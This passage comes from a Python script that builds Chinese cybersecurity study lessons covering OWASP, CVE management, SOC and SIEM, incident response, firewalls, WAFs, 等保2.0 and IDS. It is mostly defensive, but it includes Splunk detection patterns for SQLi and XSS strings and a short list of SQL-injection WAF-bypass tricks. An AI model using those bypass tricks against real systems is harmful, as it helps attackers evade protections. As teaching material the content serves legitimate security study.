             │ A01: 越权         │──→ 访问他人数据 → A09 无日志无法发现
             └──────────────────┘

防御不能单点——任何一个疏漏都可能是整条安全链的突破口
```
"""),
    ],
    [
        ('2021版三大新增', '⭐⭐⭐⭐⭐', '中', 'A04不安全设计/A08软件完整性故障/A10 SSRF'),
        ('越权排名变化', '⭐⭐⭐⭐⭐', '低', '从2017的A05升到A01——成为Web安全头号风险'),
        ('注入排名下降', '⭐⭐⭐⭐', '低', 'A01→A03但仍是高危；API/ORM的使用减少了传统SQLi'),
        ('A02 更名', '⭐⭐⭐⭐', '低', 'Sensitive Data Exposure→Cryptographic Failures，范围扩大到密码学全部'),
        ('每个风险防御', '⭐⭐⭐⭐⭐', '中', 'A01权限验证/A03参数化/A04威胁建模/A06 SBOM/A10 URL白名单'),
    ],
    [
        ('OWASP Top 10 记忆', '"越-密-注-设-配-件-认-完-日-S"', 'A01越权/A02加密失败/A03注入/A04不安全设计/A05配置错误/A06漏洞组件/A07认证失效/A08完整性/A09日志/A10 SSRF'),
    ],
    [
        ('OWASP Top 10 就是全部安全风险', 'Top 10 是"十大最常见/最严重"的风险，不是全部。还有数百种其他风险（如业务逻辑漏洞、Android/iOS安全、IoT安全等）。'),
        ('不在Top 10的风险就不重要', 'XXE 从 2017版删除≠不存在了。Top 10 是趋势反映，具体风险取决于你的应用场景。'),
    ],
    [
        '将 OWASP Top 10 2021 作为检查清单逐一对照你的应用——能找到几个风险？',
        '阅读 OWASP 官方 Top 10 文档 (https://owasp.org/Top10/)，深入理解每项风险的评分机制。',
        '在 WebGoat/OWASP Juice Shop 中实践每一项 Top 10 风险，理解攻击链。',
        '对比 2017 vs 2021 版本变化——理解安全趋势的演变方向。',
    ],
    'OWASP Top 10 是每个安全人的"十诫"——它提供了通用语言和通用框架，让开发者、安全工程师、审计员能在同一张桌面上讨论风险。第二十天，你拿到了这张"行业入场券"。',
)

print(f"  [BASIC] Day 20 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 21: CVE与漏洞管理
make_day('basic', 21, 'CVE与漏洞管理', '中级', '30',
    'CVE（Common Vulnerabilities and Exposures）是漏洞的"身份证号"——全球统一标识每一个公开披露的安全漏洞。本章详解 CVE/CVSS/CWE/CPE 体系、NVD 漏洞库使用、漏洞生命周期管理和漏洞优先级排序方法论，帮助安全团队从"打地鼠式修漏洞"升级为"数据驱动漏洞管理"。',
    [
        S('一、CVE 体系', '一cve-体系', r"""## 一、CVE 体系

```
CVE 编号格式: CVE-YYYY-NNNNN
├── CVE-2017-0144   (永恒之蓝)
├── CVE-2021-44228  (Log4Shell)
├── CVE-2022-22965  (Spring4Shell)
└── CVE-2014-0160   (Heartbleed)

CVE 不是漏洞库——它是漏洞标识符字典！
CVE = ID号
CVE + CVSS评分 + CWE类型 + CPE影响产品 = NVD记录
```

| 术语 | 全称 | 作用 |
|:---|:---|:---|
| **CVE** | Common Vulnerabilities and Exposures | 漏洞编号标识 |
| **CVSS** | Common Vulnerability Scoring System | 严重性评分 (0-10) |
| **CWE** | Common Weakness Enumeration | 弱点类型分类 |
| **CPE** | Common Platform Enumeration | 受影响产品标识 |
| **NVD** | National Vulnerability Database | 美国NIST维护的CVE增强数据库 |"""),
        S('二、漏洞生命周期', '二漏洞生命周期', r"""## 二、漏洞生命周期管理

```
         发现 → 验证 → 评估 → 修复 → 验证 → 关闭
         │                                      │
         └──────────── 持续监控 ←───────────────┘
```

### 漏洞管理成熟度

| 级别 | 特征 | 平均修复时间 |
|:---|:---|:---:|
| Level 0 | 无流程，知道了修 | 数月 |
| Level 1 | 定期扫描+手动修复 | 数周 |
| Level 2 | SLA驱动修复(Critical 24h) | 数天 |
| Level 3 | 自动化工单+补丁管理 | 数小时 |
| Level 4 | 预测性修复(基于威胁情报) | 实时 |

### 修复优先级公式

```
优先级 = CVSS × 暴露面 × 资产价值 × 威胁活跃度

其中:
├── CVSS: NVD基础评分
├── 暴露面: 是否可从互联网访问?
├── 资产价值: 该系统的业务重要性(1-5)
└── 威胁活跃度: KEV列表/EPSS预测/是否在野利用
```"""),
        S('三、NVD API 实战', '三nvd-api-实战', r"""## 三、NVD API 实战

```bash
# 查询特定CVE
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"

# 查询当日修改的Critical漏洞
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?pubStartDate=2024-01-01T00:00:00&cvssV3Severity=CRITICAL"

# Python 自动化查询
import requests
r = requests.get('https://services.nvd.nist.gov/rest/json/cves/2.0',
    params={'cveId': 'CVE-2021-44228'})
data = r.json()
cve = data['vulnerabilities'][0]['cve']
print(f"CVE: {cve['id']}")
print(f"Description: {cve['descriptions'][0]['value']}")
```

### 常用漏洞情报源

| 来源 | 网址 | 内容 |
|:---|:---|:---|
| NVD | nvd.nist.gov | CVE+CVSS完整数据 |
| CISA KEV | cisa.gov/known-exploited-vulnerabilities | 在野利用漏洞（必修!） |
| EPSS | first.org/epss | 漏洞利用概率预测 |
| 安全厂商 | 各厂商SRC/公众号 | 国内最新漏洞预警 |
| Exploit-DB | exploit-db.com | PoC/Exploit代码 |
| CNVD | cnvd.org.cn | 中国国家漏洞库 |"""),
    ],
    [
        ('CVE 编号格式', '⭐⭐⭐⭐⭐', '低', 'CVE-YYYY-NNNNN'),
        ('CVSS 3.1 评分范围', '⭐⭐⭐⭐⭐', '低', '0(None)-3.9(Low)-6.9(Med)-8.9(High)-10(Critical)'),
        ('CVE vs CWE vs CVSS', '⭐⭐⭐⭐', '中', 'CVE=漏洞ID/CWE=弱点类型/CVSS=严重性评分'),
        ('漏洞管理生命周期', '⭐⭐⭐⭐', '中', '发现→验证→评估→修复→验证→关闭'),
        ('KEV 列表', '⭐⭐⭐⭐⭐', '中', 'CISA维护的已知被利用漏洞目录→最高修复优先级'),
    ],
    [
        ('CVE 三兄弟', '"CVE是身份证、CVSS是分数、CWE是病种"', 'CVE=标识漏洞/CVSS=评判严重性/CWE=分类弱点类型'),
    ],
    [
        ('CVE 就等于危险', 'CVE 只是标识符，不代表漏洞一定能在你的环境中被利用。需要结合CVSS、暴露面、环境因素综合评估。'),
        ('CVSS 10分一定比8分紧急', '不一定！一个只能内网触发的10分漏洞 vs 一个可互联网触发的8分漏洞，后者更需要立即响应。'),
    ],
    [
        '注册 NVD API Key（免费），编写脚本自动拉取每日新增CVSS 9.0+漏洞。',
        '订阅 CISA KEV 列表更新通知。',
        '在 NVD 中搜索你团队使用的关键软件（如 Spring/Struts/Log4j），了解历史漏洞。',
    ],
    '漏洞管理不是"打地鼠"——今天修一个、明天又冒一个。真正成熟的漏洞管理是数据驱动的：你知道每个漏洞的风险值、修复成本、业务影响，然后做出理性的优先级决策。第二十一天，你学会了给漏洞"排兵布阵"。',
)

print(f"  [BASIC] Day 21 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 22: 安全运营概述
make_day('basic', 22, '安全运营概述', '中级', '35',
    '安全运营是网络安全的"守夜人"——7×24持续监控、检测、响应。本章系统讲解 SOC 架构、SIEM 日志分析、告警三分类（真阳性/假阳性/假阴性）、事件响应第一响应人职责和 SOAR 自动化编排。',
    [
        S('一、SOC 架构', '一soc-架构', r"""## 一、SOC 核心架构

```
┌──────────────────────────────────────────┐
│                 SOC 运营中心               │
├──────────┬──────────┬──────────┬─────────┤
│ Tier 1   │ Tier 2   │ Tier 3   │ 威胁狩猎 │
│ 初级分析师 │ 中级分析师 │ 高级分析师 │ 主动搜索 │
│ 告警分诊  │ 事件分析  │ 应急响应  │ 未知威胁 │
│ 70%工作量 │ 20%工作量 │ 8%工作量  │ 2%工作量  │
└──────────┴──────────┴──────────┴─────────┘
       ↑ 技术支撑: SIEM + EDR + NDR + SOAR
```

| 角色 | 职责 | 技能要求 |
|:---|:---|:---|
| **Tier 1** | 监控告警看板、初步分诊、创建工单 | 基础安全知识、SIEM操作 |
| **Tier 2** | 深入事件分析、关联威胁情报、判定真伪 | 中级分析能力、网络/系统知识 |
| **Tier 3** | 主导应急响应、恶意代码分析、根因分析 | 高级攻防知识、取证/逆向能力 |
| **威胁狩猎** | 主动搜索IOC/TTP、发现隐藏威胁 | 红队思维、大数据分析 |

> **🔑 高分考点**：SOC 三大支柱——**人员(People)、流程(Process)、技术(Technology)**。三者缺一不可。"""),
        S('二、SIEM 系统', '二siem-系统', r"""## 二、SIEM 日志分析

### SIEM 核心功能

```
日志源 → 收集器 → 解析器 → 关联引擎 → 告警 → 分析师
│                                 │
├── 防火墙/IDS/WAF               ├── 规则引擎
├── 服务器(Linux/Windows)        ├── 行为分析(UEBA)
├── 应用日志(Nginx/DB)           └── 威胁情报匹配
├── 云服务(AWS/GCP/Azure)
└── 端点(EDR)
```

### Splunk 搜索实战

```bash
# 搜索 SSH 暴力破解
index=linux sourcetype=secure "Failed password"
| stats count by src_ip
| where count > 10
| sort -count

# 搜索 Web 攻击迹象
index=web status=200
| search uri="*<script>*" OR uri="*UNION*" OR uri="*select*"
| table _time, client_ip, uri, status

# 搜索 C2 通信
index=network dst_ip=* 
| lookup threat_intel ip AS dst_ip OUTPUT category
| where isnotnull(category)
```

### 关键告警指标

| 指标 | 名称 | 全称 |
|:---|:---|:---|
| **MTTD** | 平均检测时间 | Mean Time to Detect |
| **MTTR** | 平均响应时间 | Mean Time to Respond |
| **MTTC** | 平均遏制时间 | Mean Time to Contain |
| FPR | 告警误报率 | False Positive Rate |"""),
        S('三、事件响应', '三事件响应', r"""## 三、事件响应基础

### PDCERF 模型

```
Prepare → Detect → Contain → Eradicate → Recover → Follow-up
(准备)    (检测)    (遏制)     (根除)      (恢复)    (跟进)

├── Prepare: 制定预案、准备工具、人员培训
├── Detect: 发现安全事件（SIEM告警/外部通报）
├── Contain: 隔离受感染系统、阻断C2通信
├── Eradicate: 清除恶意软件、修复漏洞
├── Recover: 恢复系统和服务
└── Follow-up: 复盘报告、改进措施
```

### 第一响应人行动清单

```text
□ 隔离：断网但不关机（保留内存证据）
□ 记录：时间、发现人、现象描述
□ 保护：不修改系统和日志
□ 上报：通知安全负责人和管理层
□ 取证：在保证业务最小影响前提下收集证据
```"""),
    ],
    [
        ('SOC 三大支柱', '⭐⭐⭐⭐⭐', '低', '人员(People)+流程(Process)+技术(Technology)'),
        ('Tier 1-3 分工', '⭐⭐⭐⭐', '中', 'T1告警分诊→T2事件分析→T3应急响应'),
        ('MTTD/MTTR', '⭐⭐⭐⭐⭐', '中', 'MTTD=平均检测时间；MTTR=平均响应时间'),
        ('告警误报处理', '⭐⭐⭐⭐', '中', '真阳性→升级；假阳性→调优规则；假阴性→增强检测'),
        ('PDCERF 模型', '⭐⭐⭐⭐⭐', '中', '准备→检测→遏制→根除→恢复→跟进'),
    ],
    [
        ('SOC 值班口诀', '"看告警-判真伪-升事件-写日报"', 'SOC分析师每日核心动作：监控看板→甄别告警→升级事件→记录工单和日报'),
    ],
    [
        ('SOC 就是看监控', 'SOC 不是"看监控"——它是一套完整的人员+流程+技术体系，需要持续优化检测规则、降低误报率、缩短响应时间。'),
        ('误报多说明SIEM不行', '一定程度的误报在所难免——目标是持续调优规则，而非追求0误报。过度调优可能导致漏报（假阴性）。'),
    ],
    [
        '搭建 ELK (Elasticsearch+Logstash+Kibana) 免费 SIEM 环境，收集 Nginx/Auth 日志。',
        '学习 Splunk 基础查询语言 (SPL)，练习从海量日志中发现异常模式。',
    ],
    '安全运营不是一个"岗位"——它是一种能力，一种"在噪声中发现信号"的持续修行。第二十二天，你摸到了安全防守者的"日常工作"。',
)

print(f"  [BASIC] Day 22 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 23: 应急响应流程
make_day('basic', 23, '应急响应流程', '中级', '35',
    '应急响应是安全事件发生后的"黄金48小时"——准确、快速、有序地处置安全事故，将损失降到最低。本章详解 PDCERF 六步模型、NIST SP 800-61 指南、常见安全事件（勒索软件/数据泄露/Web入侵）的响应策略，以及取证基础（内存取证、磁盘镜像、日志提取）。',
    [
        S('一、应急响应概述', '一应急响应概述', r"""## 一、应急响应概述

应急响应（Incident Response，IR）是对安全事件的**系统化响应流程**，目标是最小化损失并恢复服务。

| 关键原则 | 说明 |
|:---|:---|
| **先隔离再取证** | 遏制扩散优先；取证在条件允许时进行 |
| **先备份后操作** | 任何操作前对现场做镜像/快照 |
| **保持沟通** | 及时通知管理层和相关部门 |
| **记录一切** | 时间线、操作、命令输出——全部记录 |
| **依法合规** | 涉及个人信息泄露需按法规上报 |

> **🔑 高分考点**：应急响应的核心矛盾——**业务连续性 vs 安全取证**。断网遏制攻击但影响业务；保留现场利于取证但攻击持续。"""),
        S('二、PDCERF 响应流程', '二pdcrf-响应流程', r"""## 二、PDCERF 六步法

```
Prepare(准备) → Detect(检测) → Contain(遏制) → Eradicate(根除) → Recover(恢复) → Follow-up(跟进)
```

### 各阶段核心动作

| 阶段 | 关键动作 | 工具/方法 |
|:---|:---|:---|
| **Prepare** | 制定IR计划、培训团队、准备工具包 | IR手册、取证U盘、加密通信 |
| **Detect** | SIEM告警验证、入侵范围判断 | Wireshark、netstat、进程分析 |
| **Contain** | 网络隔离、账号禁用、C2阻断 | iptables、AD禁用账号、DNS sinkhole |
| **Eradicate** | 恶意软件清除、后门移除、漏洞修复 | 杀毒、补丁、重装系统 |
| **Recover** | 从干净备份恢复、验证完整性、逐步上线 | 备份恢复、功能测试 |
| **Follow-up** | 复盘会议、根因分析、改进措施 | RCA报告、IR计划更新 |

```bash
# 应急响应常用命令
# 1. 查看异常进程
ps aux --sort=-%cpu | head -20
lsof -i -P -n | grep ESTABLISHED
# 2. 查看异常网络连接
netstat -antp | grep -v LISTEN
ss -tunap
# 3. 查看最近修改文件
find / -type f -mtime -1 -ls 2>/dev/null
find /var/www -name "*.php" -mtime -1
# 4. 查看登录历史
last -20
lastb | head -20  # 失败登录
# 5. 查看 crontab 后门
cat /etc/crontab && crontab -l
ls -la /var/spool/cron/
# 6. 内存取证（需要 LiME）
insmod lime.ko "path=/tmp/mem.dump format=lime"
```"""),
        S('三、勒索软件响应', '三勒索软件响应', r"""## 三、勒索软件专项响应

```
检测信号:
├── 大量文件扩展名被更改（.lockbit/.phobos/.mallox）
├── 桌面出现勒索信（README.txt）
├── CPU/磁盘 IO 异常飙升
└── 大量 SMB 连接（横向传播）
```

### 响应步骤

```text
步骤 1: 立即断网（拔网线！）——阻止进一步加密和横向传播
步骤 2: 识别勒索软件家族 → https://id-ransomware.malwarehunterteam.com/
步骤 3: 检查是否有解密工具 → https://www.nomoreransom.org/
步骤 4: 确定感染入口（RDP爆破? 钓鱼邮件? VPN漏洞?）
步骤 5: 从离线备份恢复（绝不要支付赎金!）

预防要点:
□ 3-2-1备份策略（3份副本/2种介质/1份离线）
□ RDP仅允许来自VPN
□ 邮件网关沙箱检测附件
□ 最小权限原则
```"""),
        S('四、取证基础', '四取证基础', r"""## 四、取证基础

### 证据获取顺序（易失性从高到低）

```
1. 内存      (最易失) → Memory dump (LiME, WinPMEM)
2. 网络连接   → netstat, /proc/net/tcp
3. 进程列表   → ps aux, /proc/$PID/
4. 磁盘      (持久)   → dd, FTK Imager
```

```bash
# Linux 取证收集脚本
#!/bin/bash
OUTDIR="/tmp/ir_$(date +%Y%m%d_%H%M%S)"
mkdir $OUTDIR
date > $OUTDIR/timeline.txt
ps auxf > $OUTDIR/ps.txt
netstat -antp > $OUTDIR/netstat.txt
lsof > $OUTDIR/lsof.txt
last > $OUTDIR/last.txt
find / -mtime -3 -type f > $OUTDIR/recent_files.txt
tar czf $OUTDIR.tar.gz $OUTDIR
```

### 证据完整性

```bash
# 磁盘镜像 + 哈希验证
dd if=/dev/sda of=/mnt/evidence/disk.img bs=4M status=progress
sha256sum /dev/sda > /mnt/evidence/disk.sha256
```"""),
    ],
    [
        ('PDCERF 六步', '⭐⭐⭐⭐⭐', '低', 'Prepare→Detect→Contain→Eradicate→Recover→Follow-up'),
        ('应急响应核心矛盾', '⭐⭐⭐⭐', '中', '业务连续性 vs 安全取证'),
        ('证据易失性顺序', '⭐⭐⭐⭐', '中', '内存→网络→进程→磁盘'),
        ('勒索软件第一响应', '⭐⭐⭐⭐⭐', '中', '断网→识别家族→找解密工具→离线恢复→不付赎金'),
        ('3-2-1 备份策略', '⭐⭐⭐⭐⭐', '低', '3份副本/2种介质/1份离线'),
    ],
    [
        ('PDCERF 记忆', '"准-检-堵-清-还-总"', '准备→检测→遏制→根除→恢复→总结'),
        ('勒索软件应对', '"断网-识别-找工具-恢复-不付钱"', '遇到勒索软件记住这五步，恐慌是最大的敌人'),
    ],
    [
        ('被入侵后马上关机', '关机丢失内存中的关键证据。正确做法：先断网→内存取证→磁盘镜像→再关机。'),
        ('付赎金就能恢复数据', '部分勒索软件即使付钱也不给解密工具；付钱变相资助黑产。正确做法：从离线备份恢复。'),
    ],
    [
        '搭建 IR 测试环境：模拟一次勒索软件事件，实践完整的 PDCERF 流程。',
        '学习使用 Volatility 做内存取证分析：进程列表→网络连接→恶意DLL检测。',
    ],
    '应急响应的质量不在"技术有多深"——而在于"流程有多稳"。慌乱中错误的操作往往比攻击本身造成更大的损失。第二十三天，你学会了如何在"着火"时保持冷静。',
)

print(f"  [BASIC] Day 23 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 24: 防火墙基础配置
make_day('basic', 24, '防火墙基础配置', '入门', '35',
    '防火墙是网络安全的第一道防线。本章系统讲解包过滤/状态检测/应用代理三类防火墙原理、iptables/nftables 实战配置（规则链、表、NAT、日志）、Windows 防火墙和云安全组管理。',
    [
        S('一、防火墙类型与原理', '一防火墙类型与原理', r"""## 一、防火墙类型

| 类型 | OSI层 | 原理 | 性能 | 安全性 |
|:---|:---|:---|:---:|:---:|
| **包过滤** | L3/L4 | 检查IP/端口/协议 | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| **状态检测** | L3/L4 | 跟踪连接状态(ESTABLISHED) | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| **应用代理** | L7 | 代理应用协议(HTTP/SMTP) | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| **NGFW** | L3-L7 | 状态检测+应用识别+IPS | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

> **🔑 高分考点**：状态检测防火墙的核心优势——自动放行"已建立连接"的返回流量，无需为返回方向额外配置规则。这是它与简单包过滤的本质区别。"""),
        S('二、iptables 实战', '二iptables-实战', r"""## 二、iptables 防火墙配置

### 三表五链

```
表(Table):          链(Chain):
┌──────────┐       ┌──────────────┐
│ filter   │ ← 默认表 │ INPUT        │ 进入本机
│ nat      │       │ OUTPUT       │ 从本机发出
│ mangle   │       │ FORWARD      │ 转发(路由)
│ raw      │       │ PREROUTING   │ (nat) 路由前
│ security │       │ POSTROUTING  │ (nat) 路由后
└──────────┘       └──────────────┘
```

```bash
# 基础规则
iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # 允许SSH
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/min -j ACCEPT  # 限速
iptables -P INPUT DROP   # 默认拒绝输入 (最后一条)

# NAT 端口转发
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.5:8080
iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -j MASQUERADE

# 防扫描(DDoS缓解)
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# 日志记录
iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROP: " --log-level 7

# 保存
iptables-save > /etc/iptables/rules.v4
```"""),
        S('三、nftables 新一代', '三nftables-新一代', r"""## 三、nftables（iptables 继任者）

```bash
# nftables 核心优势：统一的配置语法、更高效
nft add table inet filter
nft add chain inet filter input { type filter hook input priority 0\; policy drop\; }
nft add rule inet filter input ct state established,related accept
nft add rule inet filter input tcp dport 22 accept
nft add rule inet filter input ip saddr 192.168.1.0/24 accept

# 限速
nft add rule inet filter input tcp dport 80 limit rate 25/minute accept

# 保存
nft list ruleset > /etc/nftables.conf
```"""),
        S('四、Windows 防火墙', '四windows-防火墙', r"""## 四、Windows 防火墙

```powershell
# 查看规则
Get-NetFirewallRule | Where-Object Enabled -eq True

# 创建入站规则
New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow

# 创建出站限制（防数据外泄）
New-NetFirewallRule -DisplayName "Block Outbound except Web" -Direction Outbound -Action Block

# 按程序允许
New-NetFirewallRule -DisplayName "Allow Chrome" -Direction Outbound -Program "C:\Program Files\Google\Chrome\Application\chrome.exe" -Action Allow
```

### 云安全组

```bash
# AWS Security Group (状态检测，仅需定义入站规则)
aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --cidr 10.0.0.0/8
aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 443 --cidr 0.0.0.0/0

# 阿里云安全组
aliyun ecs AuthorizeSecurityGroup --RegionId cn-hangzhou --SecurityGroupId sg-xxx --IpProtocol tcp --PortRange 22/22 --SourceCidrIp 10.0.0.0/8
```"""),
    ],
    [
        ('防火墙三类型', '⭐⭐⭐⭐⭐', '中', '包过滤(L3/4)→状态检测(跟踪连接)→应用代理(L7)'),
        ('iptables 三表', '⭐⭐⭐⭐', '中', 'filter(过滤)/nat(地址转换)/mangle(修改)'),
        ('默认拒绝原则', '⭐⭐⭐⭐⭐', '低', 'iptables -P INPUT DROP; 先拒绝所有再按需开放'),
        ('状态检测优势', '⭐⭐⭐⭐⭐', '中', '自动放行已建立连接的返回流量'),
        ('云安全组特点', '⭐⭐⭐⭐', '低', '状态检测，仅需定义入站规则(出站自动放行返回)'),
    ],
    [
        ('iptables 记忆', '"进-转-出三链、过滤-NAT两表"', 'INPUT进入本机/FORWARD转发/OUTPUT发出；filter过滤/nat地址转换'),
    ],
    [
        ('防火墙配置了就不会被突破', '防火墙是"规则层面的防护"，应用层漏洞（如SQLi）可以穿过防火墙。'),
        ('iptables 规则就是安全的', '规则配置不当（如允许0.0.0.0/0访问22端口）等于没配。'),
    ],
    [
        '在 Linux 上配置 iptables 规则：SSH开放→Web端口开放→默认拒绝→日志记录。',
        '用 nmap 扫描测试你的 iptables 规则是否按预期生效。',
    ],
    '防火墙就像你家的防盗门——默认锁着，只给认识的人开。配置得当，它是第一道坚固防线；配置不当，它是墙上画的门。第二十四天，你学会了装"防盗门"。',
)

print(f"  [BASIC] Day 24 done, total lines so far: {total_lines}")
sys.stdout.flush()

# =========  Day 25-30（basic收尾）  =========
for d25_data in [
    (25, 'WAF与Web防护', '中级', '35',
     'WAF是Web应用的最后一道防线。本章详解ModSecurity规则编写、Nginx+Lua WAF、云端WAF配置和WAF绕过检测技术。',
     [
         S('一、WAF原理', '一waf原理', r"""## 一、WAF原理与部署模式

| 模式 | 部署方式 | 优缺点 |
|:---|:---|:---|
| **反向代理** | WAF作为代理接收所有流量 | 最常见，有性能开销 |
| **透明桥接** | 串联在流量中(L2) | 无网络改动但单点故障 |
| **插件/模块** | 嵌入Web服务器(ModSecurity) | 高性能，语言绑定 |
| **云WAF** | DNS引流到云端 | 免运维，延迟增加 |

```nginx
# Nginx + ModSecurity
location / {
    ModSecurityEnabled on;
    ModSecurityConfig modsecurity.conf;
    proxy_pass http://backend;
}
```"""),
         S('二、ModSecurity规则', '二modsecurity规则', r"""## 二、ModSecurity 规则实战

```apache
# 核心规则集
SecRuleEngine On
SecRule REQUEST_URI "@rx /admin" \
    "id:1001,phase:2,deny,status:403,msg:'Admin access blocked'"

# SQL注入检测
SecRule ARGS "@detectSQLi" \
    "id:2001,phase:2,deny,status:403,log,msg:'SQLi detected'"
# OWASP Core Rule Set (CRS)
# Include crs-setup.conf 和 rules/*.conf

# IP 白名单
SecRule REMOTE_ADDR "@ipMatch 192.168.1.0/24" \
    "phase:1,id:5001,allow"
```"""),
         S('三、WAF绕过与加固', '三waf绕过与加固', r"""## 三、WAF 绕过与加固

```bash
# 常见WAF绕过
# 1. 大小写: SeLeCt → SELect
# 2. 注释: SEL/**/ECT
# 3. 编码: %53%45%4C%45%43%54
# 4. 换行: SEL\nECT
# 5. 等价函数: substring→mid, sleep→benchmark

# 防御: WAF规则升级+定期渗透测试+结合RASP
# 工具: wafw00f (识别WAF类型)
wafw00f https://target.com
```"""),
     ],
     [
         ('WAF部署模式', '⭐⭐⭐⭐', '中', '反向代理/透明桥接/模块嵌入/云WAF'),
         ('OWASP CRS', '⭐⭐⭐⭐⭐', '中', '开源WAF规则集；定期更新；误报需调优'),
         ('WAF局限性', '⭐⭐⭐⭐', '中', '无法防御业务逻辑漏洞/0day/加密流量中的攻击'),
     ],
     [('WAF定位', '"WAF是最后一道防线，不是唯一防线"', '代码安全是根，WAF是兜底——两者缺一不可', '')],
     [('WAF可以替代安全编码', 'WAF是安全网而非安全带——它能拦住一些攻击但不能保证应用本身安全。')],
     ['配置 ModSecurity + OWASP CRS 并进行规则调优。', '使用 wafw00f 识别网站使用的WAF类型。'],
     'WAF不是万能药——它是因为代码不安全才需要的"补丁"。但现实中，WAF往往是阻止攻击的最后一道墙。第二十五天，你知道了怎么筑这道墙。',
    ),
    (26, '等级保护2.0概述', '中级', '30',
     '网络安全等级保护2.0是中国网络安全法律法规体系的核心制度。本章详解等保2.0的法律依据、定级标准（1-5级）、安全要求框架（10大类）和测评流程，是CISP考试中国法律法规方向的高频考点。',
     [
         S('一、等保法律依据', '一等保法律依据', r"""## 一、等级保护法律依据

```
法律层级:
├── 《网络安全法》(2017.6.1) — 第21条：国家实行网络安全等级保护制度
├── 《数据安全法》(2021.9.1)
├── 《个人信息保护法》(2021.11.1)
├── 《关基保护条例》(2021.9.1)
└── GB/T 22239-2019《网络安全等级保护基本要求》(等保2.0核心标准)
```

> **🔑 高分考点**：《网络安全法》第21条是等级保护制度的法律基础。等保2.0标准(GD/T 22239-2019)于2019年12月1日正式实施，取代等保1.0。
"""),
         S('二、定级标准', '二定级标准', r"""## 二、安全保护等级（5级）

| 等级 | 侵害客体 | 侵害程度 | 监管强度 | 示例系统 |
|:---|:---|:---|:---|:---|
| **1级** | 个人/组织合法利益 | 一般损害 | 自主保护 | 小型企业内部网站 |
| **2级** | 个人/组织合法利益 | 严重损害 | 指导保护 | 大多数企业系统 |
| **3级** | 社会秩序/公共利益 | 特别严重损害 | 监督保护 | 金融、政务、医疗 |
| **4级** | 国家利益 | 特别严重损害 | 强制保护 | 关键基础设施 |
| **5级** | 国家安全 | 极端严重损害 | 专门保护 | 绝密级系统 |
"""),
         S('三、安全要求框架', '三安全要求框架', r"""## 三、等保2.0 安全要求（10大类）

```
├── 安全物理环境     (物理安全: 机房/温控/门禁)
├── 安全通信网络     (网络架构/通信加密)
├── 安全区域边界     (边界防护/访问控制/入侵防范)
├── 安全计算环境     (操作系统/数据库/应用安全)
├── 安全管理中心     (SOC/审计/集中管控)
├── 安全管理制度     (策略/制度/规程)
├── 安全管理机构     (岗位/人员/授权)
├── 安全管理人员     (录用/培训/离岗)
├── 安全建设管理     (采购/外包/上线前测试)
└── 安全运维管理     (变更管理/备份/应急)
```
等保2.0新增：云计算/移动互联/物联网/工业控制/大数据扩展要求。"""),
     ],
     [
         ('等保法律依据', '⭐⭐⭐⭐⭐', '低', '《网络安全法》第21条'),
         ('5个安全保护等级', '⭐⭐⭐⭐⭐', '中', '1自主/2指导/3监督/4强制/5专门'),
         ('10大安全要求', '⭐⭐⭐⭐⭐', '中', '5技术+5管理；新增云计算/移动/物联网/工控/大数据扩展'),
         ('等保2.0 vs 1.0', '⭐⭐⭐⭐', '中', '2019年12月1日实施；新增扩展要求；强调主动防御'),
     ],
     [('等保2.0变化', '"从1到2：被动变主动，通用加扩展"', '等保2.0强调主动防御(监测/预警/处置)；新增云计算等5类扩展要求', '')],
     [('等保就是买个设备过测评', '等保是系统工程——技术+管理+N个层面协同，不是买设备就能"过关"。')],
     ['阅读 GB/T 22239-2019 标准原文，了解10大类安全要求的详细控制点。'],
     '等保2.0不是"负担"——它是中国网络安全的法律基准。理解了它，你就理解了"安全合规"的全貌。第二十六天，你拿到了中国的"安全法律地图"。',
    ),
    (27, '入侵检测与防御', '中级', '30',
     'IDS/IPS（入侵检测/防御系统）是网络安全的"警报器"和"自动防卫"。本章详解签名检测vs异常检测、Snort/Suricata规则编写、网络陷阱与Honeypot。',
     [
         S('一、IDS vs IPS', '一ids-vs-ips', r"""## 一、IDS vs IPS

| 维度 | IDS | IPS |
|:---|:---|:---|
| 模式 | 旁路镜像（检测+告警） | 串联在线（检测+阻断） |
| 延迟 | 无 | 有 |
| 误报风险 | 仅误报告警 | 误报=正常业务被阻断 |
| 典型部署 | SPAN端口/TAP | 串接在防火墙后 |

```
流量 → 防火墙 → IPS(串联阻断) → 交换机
                ↓
              IDS(旁路检测) → SIEM
```"""),
         S('二、Snort 规则', '二snort-规则', r"""## 二、Snort/Suricata 规则

```
# Snort 规则结构
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (
    msg:"SSH Brute Force Login";
    flow:to_server,established;
    content:"Failed password";
    detection_filter:track by_src, count 5, seconds 60;
    sid:1000001; rev:1;
)

# 规则头: 动作 协议 源IP 源端口 方向 目标IP 目标端口
#   alert/drop/pass/log
```

```bash
# Suricata 测试规则
suricata -T -c /etc/suricata/suricata.yaml

# 查看告警日志
tail -f /var/log/suricata/fast.log
```"""),
     ],
     [
         ('IDS vs IPS', '⭐⭐⭐⭐⭐', '中', 'IDS旁路检测告警；IPS串联在线阻断'),
         ('签名检测 vs 异常检测', '⭐⭐⭐⭐', '中', '签名=匹配已知特征；异常=偏离基线行为'),
